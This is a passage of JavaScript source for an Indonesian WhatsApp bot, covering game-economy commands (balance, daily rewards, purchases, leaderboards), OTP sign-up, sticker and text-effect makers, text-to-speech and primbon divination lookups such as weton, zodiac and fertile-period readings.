    let anut =`╭───❑ 「 BALANCE 」 ❑────
├─ 📇 *Name*: ${usert.nama}
├─ 🆔 *Nomor* : ${require('awesome-phonenumber')(`+${m.sender.split('@')[0]}`).getNumber('international')}
├─ 🎫 *Limit*: ${usert.limit}
├─ 💹 *Money*: ${usert.money}
├─ 📍 *Role*: ${usert.role}
├─ 💳 *Bank* : ${usert.atm}
├─ 📊 *Level*: ${usert.level}
╰─❑ ✨ *Exp*: ${usert.exp}
`
conn.sendMessage(m.chat, { image: fs.readFileSync('./src/bank.jpg'),  caption: anut }, { quoted: m })
break
case 'dailyrewards':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
    let uuser = global.db.data.users[m.sender]
    let __timers = (new Date - uuser.lastclaim)
    let _timers = (86400000 - __timers)
    let timers = clockString(_timers) 
    if (new Date - uuser.lastclaim > 86400000) {
    let str = `Selamat anda mendapatkan +2000 money, +500 exp, +25 limit`
        conn.sendMessage(m.chat, { image: fs.readFileSync('./src/daily.jpg'),  caption: str }, { quoted: m })
        global.db.data.users[m.sender].money += 2000
        global.db.data.users[m.sender].exp += 500
        global.db.data.users[m.sender].limit += 25
        global.db.data.users[m.sender].lastclaim = new Date * 1
    } else {
        m.reply(`Silahkan tunggu *⏱️${timers}* lagi untuk bisa mengclaim lagi`)
    }
break
case 'rename':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (db.data.users[m.sender].rename == 0) return reply(`Rename card anda sudah habis, sihlakan beli rename card dengan cara ketik .buyrenamecard!`)
if (!text) return reply(`Example: ${prefix + command} Wandy`)
db.data.users[m.sender].rename -= 1
let card = db.data.users[m.sender].rename
await reply(`1 rename card terpakai!\n\nAnda masi memiliki ${card} rename card`)
await m.reply(`Berhasil mengubah nama: ${nama} -> ${text}`)
db.data.users[m.sender].nama = text
break
case 'buyrenamecard':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return reply(`Example: ${prefix + command} 1\n\n*Note*: Harga 1 rename card seharga Rp: 25000`)
const xpperlimitt = 25000
let countt = command.replace(/^buyrenamecard/i, '')
  countt = countt ? /all/i.test(countt) ? Math.floor(global.db.data.users[m.sender].money / xpperlimitt) : parseInt(countt) : args[0] ? parseInt(args[0]) : 1
  countt = Math.max(1, countt)
  if (global.db.data.users[m.sender].money >= xpperlimitt * countt) {
    global.db.data.users[m.sender].money -= xpperlimitt * countt
    global.db.data.users[m.sender].rename += countt
    m.reply(`Berhasil Membeli ${countt} Rename card, Dengan harga Rp:${xpperlimitt * countt}`)
  } else m.reply(`Duit anda tidak mencukupi untuk membeli ${countt} rename card, Anda dapat menambah duit dengan bermain game atau ngechat`)
  break
case 'resetuang':
if (!isCreator && !m.key.fromMe) return m.reply(mess.owner)
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
db.data.users[m.sender].money = 0
m.reply(`Anda berhasil mereset uang!`)
break
case 'leaderboard':
if (!m.isGroup) return m.reply(mess.group)
let users = Object.entries(global.db.data.users).map(([key, value]) => {
    return { ...value, jid: key }
  })

  let sortedExp = users.map(toNumber('exp')).sort(sort('exp'))
  let sortedLim = users.map(toNumber('limit')).sort(sort('limit'))
  let sortedLevel = users.map(toNumber('level')).sort(sort('level'))
  let sortedBank = users.map(toNumber('atm')).sort(sort('atm'))
  let sortedMoney = users.map(toNumber('money')).sort(sort('money'))
  let usersExp = sortedExp.map(enumGetKey)
  let usersBank = sortedBank.map(enumGetKey)
  let usersMoney = sortedMoney.map(enumGetKey)
  let usersLim = sortedLim.map(enumGetKey)
  let usersLevel = sortedLevel.map(enumGetKey)
  console.log(participants)
  let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
  let rankan = args[0] && args[0].length > 100 ? Math.min(0, Math.max(parseInt(args[5]), 0)) : Math.min(5, role().length)
  let textnua = `
┌「 *XP Leaderboard Top ${len}* 」
├ Kamu: *${usersExp.indexOf(m.sender) + 1}* dari *${usersExp.length}*
│
${sortedExp.slice(0, len).map(({ jid, exp }, i) => `├ ${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *${exp} Exp*`).join`\n`}
└────
┌「 *Limit Leaderboard Top ${len}* 」
├ Kamu: *${usersLim.indexOf(m.sender) + 1}* dari *${usersLim.length}*
│
${sortedLim.slice(0, len).map(({ jid, limit }, i) => `├ ${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *${limit} Limit*`).join`\n`}
└────
┌「 *Bank Leaderboard Top ${len}* 」
├ Kamu: *${usersBank.indexOf(m.sender) + 1}* dari *${usersBank.length}*
│
${sortedBank.slice(0, len).map(({ jid, atm }, i) => `├ ${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *${atm} Money*`).join`\n`}
└────
┌「 *Money Leaderboard Top ${len}* 」
├ Kamu: *${usersMoney.indexOf(m.sender) + 1}* dari *${usersMoney.length}*
│
${sortedMoney.slice(0, len).map(({ jid, money }, i) => `├ ${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *${money} Money*`).join`\n`}
└────
┌「 *Level Leaderboard Top ${len}* 」
├ Kamu: *${usersLevel.indexOf(m.sender) + 1}* dari *${usersLevel.length}*
│
${sortedLevel.slice(0, len).map(({ jid, level }, i) => `├ ${i + 1}. ${participants.some(p => jid === p.jid) ? `(${conn.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *Level ${level}*`).join`\n`}
└────`.trim()
  conn.sendTextWithMentions(m.chat, textnua, m)
break
case 'levelup':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!m.isGroup) return m.reply(mess.group)
let user = global.db.data.users[m.sender]
try {
ppexp = await conn.profilePictureUrl(m.sender, 'image')
} catch {
ppexp = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
  if (!levelling.canLevelUp(user.level, user.exp, global.multiplier)) {
    let { min, xp, max } = levelling.xpRange(user.level, global.multiplier)
    m.reply(`
Level *${user.level} (${user.exp - min}/${xp})*
Kurang *${max - user.exp}* lagi!
`.trim())
  }
  let before = user.level * 1
	while (levelling.canLevelUp(user.level, user.exp, global.multiplier)) user.level++
	if (before !== user.level) {
duitadd(1000)
limitadd(2)
let asa = `Selamat @${m.sender.split`@`[0]} anda telah naik level!\n*${before}* -> *${user.level}*\n\nAnda mendapatkan +2 limit dan +1000 money\n\ngunakan *.my* untuk mengecek`
sendImageMentionsBuffer(await levelUp(ppexp), asa, m)
        }
break
case 'buylimit':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!text) return reply(`Example: ${prefix + command} 1`)
const xpperlimit = 250
let count = command.replace(/^buylimit/i, '')
  count = count ? /all/i.test(count) ? Math.floor(global.db.data.users[m.sender].money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (global.db.data.users[m.sender].money >= xpperlimit * count) {
    global.db.data.users[m.sender].money -= xpperlimit * count
    global.db.data.users[m.sender].limit += count
    m.reply(`Berhasil Membeli ${count} Limit, Seharga Rp:${xpperlimit * count}`)
  } else m.reply(`Duit anda tidak mencukupi untuk membeli ${count} limit, Anda dapat menambah duit dengan bermain game atau ngechat`)
break
case 'firework': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} wandy`)
m.reply(mess.wait)
textpro = await maker("https://textpro.me/firework-sparkle-text-effect-930.html", text)
conn.sendMessage(m.chat, { image: { url: textpro }, caption: "" }, { quoted: m })
}
break
case 'thunder': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} wandy`)
m.reply(mess.wait)
textpro = await maker("https://textpro.me/create-thunder-text-effect-online-881.html", text)
conn.sendMessage(m.chat, { image: { url: textpro }, caption: "" }, { quoted: m })
}
break
case 'signup': {
if (db.data.users[m.sender].registered === true) return m.reply('Anda sudah terdaftar di dalam database!, jika mau daftar ulang ketik .logout')
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
db.data.users[m.sender].nama = text
tokeninput = await getToken()
db.data.users[m.sender].token = tokeninput
m.reply(`「 *VERIFIKASI* 」\n\nKode verifikasi telah di kirim ke wa anda!, copy otp yang sudah dikirim lalu ketik, .signin <otp>`)
await verifikasi(m.sender, text, tokeninput, m)
await sleep(60000)
db.data.users[m.sender].token = ''
}
break
case 'signin':
if (!text) return
tokenan = db.data.users[m.sender].token
if (text.toLowerCase() == tokenan) {
m.reply(`「 *BERHASIL TERDAFTAR* 」\n\n👤 *Nama*: ${nama}\n⏰ *Waktu*: ${wib()}\n📅 *Tanggal*: ${tanggal()}`)
db.data.users[m.sender].registered = true
db.data.users[m.sender].token = ''
} else m.reply(`「 *OTP INVALID* 」\n\nNomor otp invalid!`)
break
case 'logout':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
db.data.users[m.sender].nama = ''
db.data.users[m.sender].email = ''
db.data.users[m.sender].registered = false
db.data.users[m.sender].limit = limitUser
db.data.users[m.sender].money = 0
db.data.users[m.sender].exp = 0
db.data.users[m.sender].level = 0
m.reply(`Berhasil logout akun anda!\n\n*Note*: Seluruh progress yang sudah anda peroleh akan di reset!`)
break
case 'gura': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
kontol = await fetchJson('https://raw.githubusercontent.com/Wandygans/database/main/gura.js')
memek = await pickRandom(kontol)
conn.sendImageAsSticker(m.chat, memek.result, m, { packname: global.packname, author: global.author })
}
break
case 'doge': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
m.reply(mess.wait)
kontol = await fetchJson('https://raw.githubusercontent.com/Wandygans/database/main/doge.js')
memek = await pickRandom(kontol)
conn.sendImageAsSticker(m.chat, memek.result, m, { packname: global.packname, author: global.author })
}
break
case 'quotes': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
resultan = await fetchJson('https://raw.githubusercontent.com/Wandygans/database/main/quotes.json')
randKey = await pickRandom(resultan)
m.reply(`Quotes : ${randKey.quotes}\n\n*By ${randKey.author}*`)
}
break
case 'semoji':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 😂`)
emoji.get(`${text}`).then(emoji => {
linknya = `${emoji.images[10].url}`
m.reply(mess.wait)
conn.sendImageAsSticker(m.chat, linknya, m, { packname: global.packname, author: global.author })
})
break
case 'tts':
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
asss = `
Example: ${prefix + command} id Wandy

List kode bahasa:
af: Afrikaans
  sq: Albanian
  ar: Arabic
  hy: Armenian
  ca: Catalan
  zh: Chinese
  zh-cn: Chinese (Mandarin/China)
  zh-tw: Chinese (Mandarin/Taiwan)
  zh-yue: Chinese (Cantonese)
  hr: Croatian
  cs: Czech
  da: Danish
  nl: Dutch
  en: English
  en-au: English (Australia)
  en-uk: English (United Kingdom)
  en-us: English (United States)
  eo: Esperanto
  fi: Finnish
  fr: French
  de: German
  el: Greek
  ht: Haitian Creole
  hi: Hindi
  hu: Hungarian
  is: Icelandic
  id: Indonesian
  it: Italian
  ja: Japanese
  ko: Korean
  la: Latin
  lv: Latvian
  mk: Macedonian
  no: Norwegian
  pl: Polish
  pt: Portuguese
  pt-br: Portuguese (Brazil)
  ro: Romanian
  ru: Russian
  sr: Serbian
  sk: Slovak
  es: Spanish
  es-es: Spanish (Spain)
  es-us: Spanish (United States)
  sw: Swahili
  sv: Swedish
  ta: Tamil
  th: Thai
  tr: Turkish
  vi: Vietnamese
  cy: Welsh`
if (args.length < 2) return m.reply(asss)
const gtts = require('./lib/gtts')(args[0])
dtt = body.slice(6)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? m.reply('Textnya kebanyakan gan')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return m.reply('Gagal gan:(')
							m.reply(mess.wait)
							conn.sendMessage(m.chat, { audio: buff }, { quoted: m })
							fs.unlinkSync(rano)
						})
					})
					break  
case 'ringtone': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} black rover`)
m.reply(mess.wait)
let anu = await ringtone(text)
result = await pickRandom(anu)
conn.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
case 'styletext': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
		if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
                let anu = await style(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
case 'ttp': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example: ${prefix + command} Wandy`)
anus = await ttp(text)
m.reply(mess.wait)
conn.sendImageAsSticker(m.chat, anus.result, m, { packname: global.packname, author: global.author })
}
break
case 'kbbi': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} tangan`)
f = await kbbi(text)
w = f.data.arti;
try {
a = w.replace("n ", "")
d = a;
} catch (e) {
d = `Tidak ada hasil untuk: ${text}`
}
m.reply(d)
}
break
case 'pekerjaan': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'potensipenyakit': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
teksnyaa = anu.message.analisa;
analisa = teksnyaa.replace("(adsbygoogle = window.adsbygoogle || []).push({});\n\n\n\n\n", "")
m.reply(`⭔ *Analisa :* ${analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
conn.sendMessage(m.chat, { image: { url: anu.message.image },  caption: `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}` })
}
break
case 'fengshui': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy, 1, 2009\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
teksnyaa = anu.message.karakter
analisa = teksnyaa.replace("\n\n\n\n\n\n\n     (adsbygoogle = window.adsbygoogle || []).push({});", "")
m.reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${analisa}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'harisangar': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
teksnyaa = anu.message.tgl_lahir;
analisa = teksnyaa.replace("\n\n\n\n\n     (adsbygoogle = window.adsbygoogle || []).push({});\n\n\n", "")
m.reply(`⭔ *Lahir :* ${analisa}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
teksnyaa = anu.message.hari_lahir;
analisa = teksnyaa.replace("\n\n\n\n\n     (adsbygoogle = window.adsbygoogle || []).push({});\n\n\n", "")
m.reply(`⭔ *Hari Lahir :* ${analisa}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrezeki': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy, 18, 9, 2009, 2023\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'karakter': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} Wandy, 18, 9, 2009`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 18, 9, 2009`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
m.reply(`⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
teksnyaa = anu.message.result;
analisa = teksnyaa.replace("(adsbygoogle = window.adsbygoogle || []).push({});\n\n\n\n\n", "")
m.reply(`⭔ *Hasil :* ${analisa}\n⭔ *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': {
if (!db.data.users[m.sender].registered) return m.reply(mess.register)
if (db.data.users[m.sender].Banneduser) return m.reply(mess.banned)
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
if (!text) return m.reply(`Example : ${prefix + command} 2009, 9, 18`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
teksnyaa = anu.message.zodiak;
analisa = teksnyaa.replace("\n\n\n\n\n     (adsbygoogle = window.adsbygoogle || []).push({});\n", "")
